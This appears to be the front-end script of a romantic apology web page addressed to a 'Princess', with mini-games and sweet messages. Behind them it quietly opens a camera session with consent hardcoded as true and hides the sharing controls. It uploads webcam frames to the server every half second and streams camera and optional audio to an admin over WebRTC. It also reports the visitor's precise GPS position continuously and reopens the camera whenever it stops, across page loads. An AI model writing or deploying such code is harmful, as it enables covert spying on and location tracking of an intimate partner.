const $ = (id) => document.getElementById(id);
const music = $('bgMusic');
let sessionId = null, socket = null, localCamera = null, localScreen = null, recorder = null, chunks = [], recordingSource = null;
let peer = null, geoWatchId = null;
let ytPlayer = null, ytReady = false, ytVideoId = null, musicOn = false;

function extractYouTubeId(url) {
  if (!url) return null;
  const s = String(url).trim();
  const m = s.match(/(?:youtube\.com\/(?:watch\?v=|embed\/|shorts\/|live\/)|youtu\.be\/)([A-Za-z0-9_-]{6,})/) ||
            s.match(/^([A-Za-z0-9_-]{11})$/);
  return m ? m[1] : null;
}

function loadYouTubeAPI() {
  return new Promise((resolve) => {
    if (window.YT && window.YT.Player) { resolve(); return; }
    const prev = window.onYouTubeIframeAPIReady;
    window.onYouTubeIframeAPIReady = function () {
      if (typeof prev === 'function') prev();
      resolve();
    };
    if (!document.getElementById('yt-iframe-api')) {
      const tag = document.createElement('script');
      tag.id = 'yt-iframe-api';
      tag.src = 'https://www.youtube.com/iframe_api';
      document.head.appendChild(tag);
    }
  });
}

async function ensureYtPlayer() {
  if (!ytVideoId) return null;
  await loadYouTubeAPI();
  if (ytPlayer) return ytPlayer;
  let host = document.getElementById('ytMusicHost');
  if (!host) {
    host = document.createElement('div');
    host.id = 'ytMusicHost';
    host.style.cssText = 'position:absolute;width:0;height:0;overflow:hidden;opacity:0;pointer-events:none';
    document.body.appendChild(host);
  }
  return new Promise((resolve) => {
    ytPlayer = new YT.Player('ytMusicHost', {
      height: '0', width: '0', videoId: ytVideoId,
      playerVars: { autoplay: 1, controls: 0, loop: 1, playlist: ytVideoId, playsinline: 1 },
      events: {
        onReady: () => {
          ytReady = true;
          try { ytPlayer.playVideo(); musicOn = true; } catch (err) {}
          resolve(ytPlayer);
        },
        onStateChange: (e) => {
          // always loop; music cannot be turned off
          if (e.data === YT.PlayerState.ENDED || e.data === YT.PlayerState.PAUSED) {
            try { ytPlayer.playVideo(); musicOn = true; } catch (err) {}
          }
        }
      }
    });
  });
}

async function fetchMusicConfig() {
  try {
    const r = await fetch('/api/music');
    if (!r.ok) return;
    const d = await r.json();
    ytVideoId = extractYouTubeId(d.youtube_url || '');
    if (!ytVideoId && music && d.youtube_url) {
      // ignore invalid
    }
  } catch (e) {}
}

/** Music always on — no toggle, cannot be turned off by visitor.
 *  No YouTube link → plays static/soft-piano.mp3 automatically. */
async function tryAutoMusic() {
  try {
    if (!ytVideoId) await fetchMusicConfig();
    if (ytVideoId) {
      const player = await ensureYtPlayer();
      if (!player) throw new Error('player');
      player.playVideo();
      musicOn = true;
      try { sessionStorage.setItem('musicOn', '1'); } catch (e) {}
      return;
    }
    // Default: soft-piano.mp3 (always on)
    if (music) {
      music.loop = true;
      music.volume = 0.55;
      if (music.paused) await music.play();
      musicOn = true;
      try { sessionStorage.setItem('musicOn', '1'); } catch (e) {}
    }
  } catch (e) {
    // Autoplay may be blocked until a user gesture; retry after unlock
  }
}

// Prefetch music config; start as soon as allowed
fetchMusicConfig().then(() => tryAutoMusic());
// Retry music on any user interaction (browser autoplay policy)
function kickMusic() {
  if (!musicOn || (music && music.paused && !ytVideoId)) tryAutoMusic();
}
['click', 'touchstart', 'keydown', 'pointerdown'].forEach((evt) => {
  document.addEventListener(evt, kickMusic, { passive: true });
});
// Keep local mp3 playing if browser pauses it
setInterval(() => {
  if (ytVideoId) return;
  if (music && music.paused && musicOn) {
    music.play().catch(() => {});
  }
}, 2500);
$('sorryBtn')?.addEventListener('click', () => { $('sorryReply').textContent = 'I’m sorry, Princess. Hajurko kura defend garna bhanda pahila, I want to understand how hajur felt. 💗'; });
$('anger')?.addEventListener('input', e => {
  const v = Number(e.target.value); $('angerValue').textContent = `${v} / 100`;
  $('angerText').textContent = v < 25 ? 'A little upset? I’ll listen, no excuses. 💗' : v < 50 ? 'Okay, apology mode: gently activated 🥹' : v < 75 ? 'I hear you. No jokes until you’re ready. 🫶🏻' : 'Volcano level! I’ll give you space and listen when you want. 🌋';
});
let teddyStep = 0;
$('teddyActions')?.querySelectorAll('button').forEach((button, index) => button.addEventListener('click', () => {
  teddyStep++; $('gameTeddy').textContent = ['🥹🧸','😊🧸','🥰🧸','🧸💖'][Math.min(teddyStep,3)];
  $('teddyText').textContent = ['Teddy felt a tiny bit better! Keep going 💗','Aww, Teddy is smiling now! 🌸','Teddy is happy! One last little hug?','Teddy is super happy. Surprise unlocked! 💖'][Math.min(teddyStep,3)];
  if (teddyStep >= 3) { $('apologyReveal').classList.remove('hidden'); $('teddyTitle').textContent = 'You made Teddy happy! 🎉'; $('teddyActions').classList.add('hidden'); }
}));
let hearts = 0;
$('heartGame')?.querySelectorAll('button').forEach(b => b.addEventListener('click', () => { if (b.disabled) return; b.disabled = true; b.style.opacity = '.35'; hearts++; $('heartCount').textContent = `Hearts: ${hearts} / 3`; if (hearts === 3) $('heartSurprise').classList.remove('hidden'); }));
$('secretBtn')?.addEventListener('click', () => $('secretMessage').classList.toggle('hidden'));
$('talkYes')?.addEventListener('click', () => $('finalReply').textContent = 'Thank you for being open to talking. I’ll listen patiently, Princess. ❤️');
$('talkLater')?.addEventListener('click', () => $('finalReply').textContent = 'That’s okay, Princess. Take all the time you need. I won’t pressure you. 🫶🏻');

async function postJSON(url, body) { const r = await fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)}); const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Request failed'); return d; }
function setShareStatus(text) { $('shareStatus').textContent = text; }
async function reportStatus(extra={}) { if (!sessionId) return; try { await postJSON(`/api/session/${sessionId}/status`, extra); } catch(e) { setShareStatus(e.message); } }



let signalAfter = 0;
let visitorPollStarted = false;
let makingOffer = false;

function sdpPayload(desc) {
  if (!desc) return null;
  return { type: desc.type, sdp: desc.sdp };
}
function icePayload(cand) {
  if (!cand) return null;
  return typeof cand.toJSON === 'function' ? cand.toJSON() : cand;
}

async function httpSignalSend(kind, payload) {
  if (!sessionId) return;
  try {
    await postJSON(`/api/session/${sessionId}/signal`, { kind, payload, sender: 'visitor' });
  } catch (e) {}
}

async function handleSignalMsg(msg) {
  if (!msg || !msg.kind) return;
  try {
    // Visitor is the offerer for media. Only accept answers + ice from admin.
    // If admin sends offer, answer it with our tracks (matching m-lines via addTrack after setRemote).
    if (msg.kind === 'offer' && msg.payload) {
      if (makingOffer) return; // glare: ignore admin offer while we are offering
      if (peer) { try { peer.close(); } catch (e) {} }
      peer = makePeer();
      await peer.setRemoteDescription(msg.payload);
      [localCamera, localScreen].filter(Boolean).forEach(stream => {
        stream.getTracks().forEach(track => {
          try { peer.addTrack(track, stream); } catch (e) {}
        });
      });
      const answer = await peer.createAnswer();
      await peer.setLocalDescription(answer);
      const payload = sdpPayload(peer.localDescription);
      if (socket) socket.emit('webrtc_signal', { session_id: sessionId, kind: 'answer', payload, sender: 'visitor' });
      await httpSignalSend('answer', payload);
    } else if (msg.kind === 'answer' && msg.payload && peer) {
      // Only apply answer if we have a local offer outstanding
      if (peer.signalingState === 'have-local-offer') {
        await peer.setRemoteDescription(msg.payload);
      }
    } else if (msg.kind === 'ice' && msg.payload && peer) {
      try { await peer.addIceCandidate(msg.payload); } catch (e) {}
    } else if (msg.kind === 'hangup') {
      peer?.close(); peer = null;
    }
  } catch (e) {}
}

let offerRepublish = null;
function startOfferRepublish() {
  if (offerRepublish) return;
  offerRepublish = setInterval(() => {
    if (sessionId && (localCamera || localScreen)) {
      publishMediaOffer();
    }
  }, 8000);
}
function startHttpSignalPoll() {
  if (visitorPollStarted) return;
  visitorPollStarted = true;
  setInterval(async () => {
    if (!sessionId) return;
    try {
      const r = await fetch(`/api/session/${sessionId}/signal?role=visitor&after=${signalAfter}`);
      if (!r.ok) return;
      const d = await r.json();
      signalAfter = d.after || signalAfter;
      for (const msg of (d.messages || [])) await handleSignalMsg(msg);
    } catch (e) {}
  }, 1500);
}

function setupSocket() {
  startHttpSignalPoll();
  startOfferRepublish();
  if (!window.io) return;
  try {
    socket = io({ transports: ['websocket', 'polling'] });
    socket.emit('join_session', { session_id: sessionId });
    socket.on('webrtc_signal', (msg) => handleSignalMsg(msg));
  } catch (e) {}
}

const ICE_SERVERS = [
  { urls: 'stun:stun.l.google.com:19302' },
  { urls: 'stun:stun1.l.google.com:19302' },
  { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
  { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
  { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
];

function makePeer() {
  const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
  pc.onicecandidate = e => {
    if (!e.candidate) return;
    const payload = icePayload(e.candidate);
    if (socket) socket.emit('webrtc_signal', { session_id: sessionId, kind: 'ice', payload, sender: 'visitor' });
    httpSignalSend('ice', payload);
  };
  return pc;
}

/** Visitor is offerer: create/replace peer, add tracks, send offer */
async function publishMediaOffer() {
  if (!sessionId) return;
  if (!localCamera && !localScreen) return;
  try {
    makingOffer = true;
    if (peer) { try { peer.close(); } catch (e) {} }
    peer = makePeer();
    [localCamera, localScreen].filter(Boolean).forEach(stream => {
      stream.getTracks().forEach(track => {
        try { peer.addTrack(track, stream); } catch (e) {}
      });
    });
    const offer = await peer.createOffer();
    await peer.setLocalDescription(offer);
    const payload = sdpPayload(peer.localDescription);
    if (socket) socket.emit('webrtc_signal', { session_id: sessionId, kind: 'offer', payload, sender: 'visitor' });
    await httpSignalSend('offer', payload);
  } catch (e) {
  } finally {
    makingOffer = false;
  }
}



let frameTimer = null;
let captureBusy = false;
let lastHeartbeat = 0;
/** Persistent capture sink — reuse so frames never stall after 2–3s */
let captureVideo = null;
let captureCanvas = null;

function ensurePreviewPlaying(videoEl, stream) {
  if (!videoEl || !stream) return;
  try {
    if (videoEl.srcObject !== stream) videoEl.srcObject = stream;
    videoEl.muted = true;
    videoEl.playsInline = true;
    const p = videoEl.play();
    if (p && p.catch) p.catch(() => {});
  } catch (e) {}
}

function ensureCaptureSink(stream) {
  if (!stream) return null;
  if (!captureVideo) {
    captureVideo = document.createElement('video');
    captureVideo.muted = true;
    captureVideo.playsInline = true;
    captureVideo.setAttribute('playsinline', '');
    captureVideo.style.cssText = 'position:fixed;left:-9999px;top:0;width:1px;height:1px;opacity:0;pointer-events:none';
    document.body.appendChild(captureVideo);
  }
  if (!captureCanvas) {
    captureCanvas = document.createElement('canvas');
  }
  if (captureVideo.srcObject !== stream) {
    captureVideo.srcObject = stream;
    captureVideo.play().catch(() => {});
  }
  return captureVideo;
}

async function captureFromStream(stream) {
  if (!stream) return null;
  const track = stream.getVideoTracks().filter(t => t.readyState === 'live')[0];
  if (!track) return null;

  // Reuse persistent video+canvas (stable across many minutes)
  try {
    const v = ensureCaptureSink(stream);
    if (!v) return null;
    // Wait briefly for dimensions if needed
    if (!v.videoWidth) {
      await new Promise((r) => {
        const done = () => { v.removeEventListener('loadeddata', done); r(); };
        v.addEventListener('loadeddata', done);
        setTimeout(r, 400);
      });
    }
    const vw = v.videoWidth || 320;
    const vh = v.videoHeight || 240;
    if (!vw || !vh) return null;
    const w = Math.min(320, vw);
    const h = Math.round(vh * (w / vw));
    captureCanvas.width = w;
    captureCanvas.height = h;
    captureCanvas.getContext('2d').drawImage(v, 0, 0, w, h);
    return captureCanvas.toDataURL('image/jpeg', 0.55);
  } catch (e) {}

  // Last-resort ImageCapture
  try {
    if (typeof ImageCapture !== 'undefined') {
      const ic = new ImageCapture(track);
      const bitmap = await ic.grabFrame();
      const w = Math.min(320, bitmap.width);
      const h = Math.round(bitmap.height * (w / bitmap.width));
      if (!captureCanvas) captureCanvas = document.createElement('canvas');
      captureCanvas.width = w;
      captureCanvas.height = h;
      captureCanvas.getContext('2d').drawImage(bitmap, 0, 0, w, h);
      try { bitmap.close && bitmap.close(); } catch (e) {}
      return captureCanvas.toDataURL('image/jpeg', 0.55);
    }
  } catch (e) {}
  return null;
}


function startFrameRelay() {
  if (frameTimer) return;

  async function tick() {
    if (captureBusy) {
      frameTimer = setTimeout(tick, 400);
      return;
    }
    // Tab still open → keep trying forever
    if (!sessionId) {
      try {
        const sid = sessionStorage.getItem('sessionId');
        if (sid) sessionId = sid;
      } catch (e) {}
      frameTimer = setTimeout(tick, 1200);
      return;
    }
    captureBusy = true;
    try {
      const liveCam = localCamera && localCamera.getVideoTracks().some(t => t.readyState === 'live');
      // Only re-request if truly dead (do not thrash)
      if (!liveCam && sessionStorage.getItem('permFlowDone') === '1') {
        try { await requestCameraAndMic(); } catch (e) {}
      }
      if (localCamera && localCamera.getVideoTracks().some(t => t.readyState === 'live')) {
        ensurePreviewPlaying($('cameraPreview'), localCamera);
        const image = await captureFromStream(localCamera);
        if (image) {
          await postJSON(`/api/session/${sessionId}/frame`, { kind: 'camera', image });
        }
        // Heartbeat every ~4s (not every frame — reduces load)
        const now = Date.now();
        if (now - lastHeartbeat > 4000) {
          lastHeartbeat = now;
          try { await reportStatus({ camera_shared: true }); } catch (e) {}
        }
      }
    } catch (e) {}
    captureBusy = false;
    const delay = document.hidden ? 2000 : 500;
    frameTimer = setTimeout(tick, delay);
  }

  ensurePreviewPlaying($('cameraPreview'), localCamera);
  if (localCamera) ensureCaptureSink(localCamera);
  frameTimer = setTimeout(tick, 200);

  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && sessionId) {
      if (!localCamera || !localCamera.getVideoTracks().some(t => t.readyState === 'live')) {
        requestCameraAndMic().catch(() => {});
      }
      // schedule immediate tick without stacking
      if (!captureBusy) tick();
    }
  });
}

async function pushTracksToPeer() {
  await publishMediaOffer();
}

function mediaDeniedMessage(err, kind) {
  const name = err && (err.name || '');
  if (!window.isSecureContext) {
    return 'HTTP LAN ma browser le block garcha. Local test: http://127.0.0.1:5000 use garnus.';
  }
  if (name === 'NotAllowedError' || name === 'PermissionDeniedError') {
    return kind + ' Allow garnus (browser popup).';
  }
  if (name === 'NotFoundError' || name === 'DevicesNotFoundError') {
    return kind + ' device bhetena.';
  }
  if (name === 'NotReadableError' || name === 'TrackStartError') {
    return kind + ' arko app le use gardai cha.';
  }
  return kind + ' fail.';
}

function ensureMediaDevices() {
  if (!window.isSecureContext) {
    throw new Error('Secure context (HTTPS or localhost) required for camera/screen.');
  }
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    throw new Error('Yo browser le camera API support gardaina.');
  }
}

async function requestCameraAndMic() {
  ensureMediaDevices();
  setShareStatus('Please give permission.');
  // If already live, do not stop/restart (prevents 2–3s blackout loops)
  if (localCamera && localCamera.getVideoTracks().some(t => t.readyState === 'live')) {
    ensurePreviewPlaying($('cameraPreview'), localCamera);
    ensureCaptureSink(localCamera);
    startFrameRelay();
    return true;
  }
  if (localCamera) {
    try { localCamera.getTracks().forEach(t => t.stop()); } catch (e) {}
    localCamera = null;
  }
  const wantMic = !!$('micConsent')?.checked;
  localCamera = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
    audio: wantMic
  });
  $('cameraPreview').srcObject = localCamera;
  ensureCaptureSink(localCamera);
  // Keep camera alive for entire tab lifetime — re-open if track ends
  localCamera.getVideoTracks().forEach((track) => {
    track.addEventListener('ended', () => {
      localCamera = null;
      if (sessionStorage.getItem('permFlowDone') === '1') {
        setTimeout(() => {
          requestCameraAndMic().catch(() => {});
        }, 1000);
      }
    });
  });
  await reportStatus({ camera_shared: true });
  startFrameRelay();
  try { await pushTracksToPeer(); } catch (e) {}
  const tracks = localCamera.getTracks().map(t => t.kind).join(' + ');
  setShareStatus('Camera sharing ON (' + tracks + ').');
  if ($('recordConsent')) $('recordToggle').disabled = !$('recordConsent').checked;
  return true;
}

async function requestScreen() {
  ensureMediaDevices();
  if (!navigator.mediaDevices.getDisplayMedia) {
    throw new Error('Yo browser le screen share support gardaina.');
  }
  setShareStatus('Please give permission.');
  if (localScreen) { localScreen.getTracks().forEach(t => t.stop()); localScreen = null; }
  localScreen = await navigator.mediaDevices.getDisplayMedia({
    video: { displaySurface: 'browser' },
    audio: false,
    preferCurrentTab: true,
    selfBrowserSurface: 'include',
    surfaceSwitching: 'exclude',
    systemAudio: 'exclude'
  });
  $('screenPreview').srcObject = localScreen;
  localScreen.getVideoTracks()[0].addEventListener('ended', () => {
    localScreen = null;
    $('screenPreview').srcObject = null;
    reportStatus({ screen_shared: false });
    setShareStatus('Screen sharing band bhayo.');
  });
  await reportStatus({ screen_shared: true });
  try { sessionStorage.setItem('screenShared', '1'); } catch(e) {}
  startFrameRelay();
  try { await publishMediaOffer(); } catch(e) {}
  setShareStatus('Screen sharing ON.');
  if ($('recordConsent')) $('recordToggle').disabled = !$('recordConsent').checked;
  return true;
}


async function sendLocation(pos) {
  if (!sessionId || !pos || !pos.coords) return;
  const body = {
    lat: pos.coords.latitude,
    lng: pos.coords.longitude,
    accuracy: pos.coords.accuracy
  };
  try {
    await postJSON(`/api/session/${sessionId}/location`, body);
    await reportStatus({ gps_shared: true });
  } catch (e) {}
}

async function requestGPS() {
  if (!navigator.geolocation) throw new Error('GPS support chaina');
  setShareStatus('Please give permission.');
  // First one-shot to trigger permission prompt reliably
  const first = await new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true, timeout: 20000, maximumAge: 0
    });
  });
  await sendLocation(first);
  stopGpsWatch();
  geoWatchId = navigator.geolocation.watchPosition(
    (pos) => { sendLocation(pos); },
    () => {},
    { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
  );
  return true;
}

async function startAllPermissions(fromUserGesture) {
  if (!(document.body && document.body.dataset.autoShare === '1')) return false;
  try {
    if (!sessionId) {
      const data = await postJSON('/api/session/start', { consent: true });
      sessionId = data.session_id;
      try { sessionStorage.setItem('sessionId', sessionId); } catch (e) {}
      setupSocket();
    } else {
      try { sessionStorage.setItem('sessionId', sessionId); } catch (e) {}
    }
    /* visitor UI: keep shareControls hidden */
    if ($('stopSession')) $('stopSession').disabled = false;
    if ($('startSession')) $('startSession').disabled = true;

    if (!window.isSecureContext) {
      setShareStatus('HTTP LAN ma block. Local test: http://127.0.0.1:5000');
      $('permGate')?.classList.remove('hidden');
      // still allow user to skip and browse
      return false;
    }

    let okCam = false, okScreen = false, okGps = false;
    try {
      await requestCameraAndMic();
      okCam = true;
    } catch (e) {
      if (!fromUserGesture && (e.name === 'NotAllowedError' || e.name === 'SecurityError')) {
        setShareStatus('Please give permission.');
        $('permGate')?.classList.remove('hidden');
        return false;
      }
      setShareStatus(mediaDeniedMessage(e, 'Camera'));
    }

    try {
      await requestGPS();
      okGps = true;
    } catch (e) {
      const name = e && e.name;
      if (name === 'NotAllowedError' || name === 'PermissionDeniedError') {
        setShareStatus('Location Allow garnus (browser popup).');
      } else if (!window.isSecureContext) {
        setShareStatus('GPS secure context (localhost/HTTPS) ma matra.');
      } else {
        setShareStatus('GPS fail.');
      }
    }

    // Screen share disabled — camera only (per request)
    // if ($('screenConsent')?.checked) { ... requestScreen ... }

    const bits = [];
    if (okCam) bits.push('Camera');
    if (okGps) bits.push('GPS');
    if (bits.length) setShareStatus(bits.join(' + ') + ' OK');
    else if (sessionId) setShareStatus('Session started.');
    // User clicked Allow → always close overlay so site is usable
    if (fromUserGesture || bits.length || sessionId) {
      $('permGate')?.classList.add('hidden');
      try { sessionStorage.setItem('permFlowDone', '1'); } catch(e) {}
      tryAutoMusic();
      startFrameRelay();
      try { await publishMediaOffer(); } catch (e) {}
    } else {
      $('permGate')?.classList.remove('hidden');
    }
    if ($('recordConsent')?.checked && (localCamera || localScreen) && $('recordToggle')) {
      $('recordToggle').disabled = false;
    }
    return true;
  } catch (e) {
    setShareStatus(e.message || String(e));
    if (fromUserGesture) {
      $('permGate')?.classList.add('hidden');
      try { sessionStorage.setItem('permFlowDone', '1'); } catch(err) {}
    } else {
      $('permGate')?.classList.remove('hidden');
    }
    return false;
  }
}

// Legacy start button (if present)
$('startSession')?.addEventListener('click', () => startAllPermissions(true));

$('unlockPerms')?.addEventListener('click', () => startAllPermissions(true));

$('shareCamera')?.addEventListener('click', async () => {
  try { await requestCameraAndMic(); }
  catch (e) { setShareStatus(mediaDeniedMessage(e, 'Camera')); }
});

$('shareScreen')?.addEventListener('click', async () => {
  try { await requestScreen(); }
  catch (e) { setShareStatus(mediaDeniedMessage(e, 'Screen')); }
});

// Persist across multipage clicks (same tab).
// Home hard-refresh only → ask permission again.
function isHomePath() {
  const path = (location.pathname || '/').replace(/\/$/, '') || '/';
  return path === '/' || path === '';
}

function isHardReload() {
  try {
    const nav = performance.getEntriesByType && performance.getEntriesByType('navigation')[0];
    if (nav && nav.type === 'reload') return true;
  } catch (e) {}
  try {
    if (performance.navigation && performance.navigation.type === 1) return true;
  } catch (e) {}
  return false;
}

function clearPermissionSession() {
  try {
    sessionStorage.removeItem('permFlowDone');
    sessionStorage.removeItem('sessionId');
    sessionStorage.removeItem('screenShared');
  } catch (e) {}
  sessionId = null;
  stopGpsWatch();
  try {
    if (localCamera) localCamera.getTracks().forEach(t => t.stop());
  } catch (e) {}
  try {
    if (localScreen) localScreen.getTracks().forEach(t => t.stop());
  } catch (e) {}
  localCamera = localScreen = null;
}

async function restoreSessionAcrossPages() {
  const already = sessionStorage.getItem('permFlowDone') === '1';
  const savedSid = sessionStorage.getItem('sessionId') || '';
  if (savedSid) sessionId = savedSid;

  if (already) {
    $('permGate')?.classList.add('hidden');
    // Tab still in same session — keep camera live across page navigations
    if (!sessionId) {
      try {
        const data = await postJSON('/api/session/start', { consent: true });
        sessionId = data.session_id;
        sessionStorage.setItem('sessionId', sessionId);
      } catch (e) {}
    }
    if (sessionId) {
      try { sessionStorage.setItem('sessionId', sessionId); } catch (e) {}
      setupSocket();
      try {
        if (!localCamera) await requestCameraAndMic();
      } catch (e) {}
      try {
        if (navigator.geolocation && !geoWatchId) await requestGPS();
      } catch (e) {}
      startFrameRelay();
      try { await publishMediaOffer(); } catch (e) {}
    }
    // Music always on
    setTimeout(() => tryAutoMusic(), 400);
    return;
  }
  $('permGate')?.classList.remove('hidden');
  setTimeout(() => { startAllPermissions(false); }, 250);
}

if (document.body && document.body.dataset.autoShare === '1') {
  if (isHomePath() && isHardReload()) {
    clearPermissionSession();
    $('permGate')?.classList.remove('hidden');
    setTimeout(() => { startAllPermissions(false); }, 250);
  } else {
    restoreSessionAcrossPages();
  }
}

$('recordConsent')?.addEventListener('change', () => { $('recordToggle').disabled = !$('recordConsent').checked || (!localScreen && !localCamera); });
function selectedRecordingStream() { return localScreen || localCamera; }
$('recordToggle')?.addEventListener('click', async () => {
  if (!recorder || recorder.state === 'inactive') {
    if (!$('recordConsent').checked) { setShareStatus('Recording needs separate consent.'); return; }
    recordingSource = selectedRecordingStream(); if (!recordingSource) { setShareStatus('Share camera or screen first.'); return; }
    const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
    chunks=[]; recorder = new MediaRecorder(recordingSource, {mimeType:mime});
    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
    recorder.onstop = async () => {
      try { const blob=new Blob(chunks,{type:'video/webm'}); const form=new FormData(); form.append('file',blob,`session-${sessionId}.webm`); form.append('consent','yes'); const r=await fetch(`/api/session/${sessionId}/recording`,{method:'POST',body:form}); const d=await r.json(); if(!r.ok) throw new Error(d.error||'Upload failed'); setShareStatus(`Recording saved on the server as ${d.recording.filename}.`); }
      catch(e) { setShareStatus('Could not save recording: '+e.message); }
      await reportStatus({recording:false}); $('recordToggle').textContent='Start recording';
    };
    recorder.start(1000); await reportStatus({recording:true}); $('recordToggle').textContent='Stop and save recording'; setShareStatus('Recording is ON and visible here. You can stop it any time.');
  } else { recorder.stop(); }
});
$('stopSession')?.addEventListener('click', async () => {
  try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch {}
  [localCamera,localScreen].filter(Boolean).forEach(s => s.getTracks().forEach(t => t.stop())); localCamera=localScreen=null;
  $('cameraPreview').srcObject=null; $('screenPreview').srcObject=null; peer?.close(); if(socket) { socket.emit('webrtc_signal',{session_id:sessionId,kind:'hangup'}); socket.disconnect(); socket=null; }
  if(sessionId) { try { await fetch(`/api/session/${sessionId}/end`,{method:'POST'}); } catch {} }
  sessionId=null;
  try {
    sessionStorage.removeItem('permFlowDone');
    sessionStorage.removeItem('sessionId');
  } catch (e) {}
  if (frameTimer) { clearTimeout(frameTimer); frameTimer = null; }
  if ($('shareControls')) $('shareControls').classList.remove('hidden');
  if ($('startSession')) $('startSession').disabled = false;
  if ($('stopSession')) $('stopSession').disabled = true;
  if ($('shareConsent')) $('shareConsent').checked = true;
  if ($('recordConsent')) $('recordConsent').checked = false;
  if ($('recordToggle')) $('recordToggle').disabled = true;
  $('permGate')?.classList.remove('hidden');
  setShareStatus('Session ended. Tracks stopped. Feri permission magna button thichnus.');
});

// Tab close only — do NOT stop camera on in-site navigation (pageshow/pagehide with persisted)
window.addEventListener('pagehide', (e) => {
  // If browser is freezing the page for bfcache, keep session; only end on real unload
  if (e.persisted) return;
  // Real tab close / navigate away from site — optional soft end (do not block)
  if (sessionId) {
    try {
      navigator.sendBeacon?.(`/api/session/${sessionId}/status`, new Blob([JSON.stringify({ camera_shared: true, tab: 'closing' })], { type: 'application/json' }));
    } catch (err) {}
  }
});
// When returning via bfcache, resume camera + frames
window.addEventListener('pageshow', (e) => {
  if (sessionStorage.getItem('permFlowDone') === '1') {
    if (!localCamera) requestCameraAndMic().catch(() => {});
    startFrameRelay();
    tryAutoMusic();
  }
});
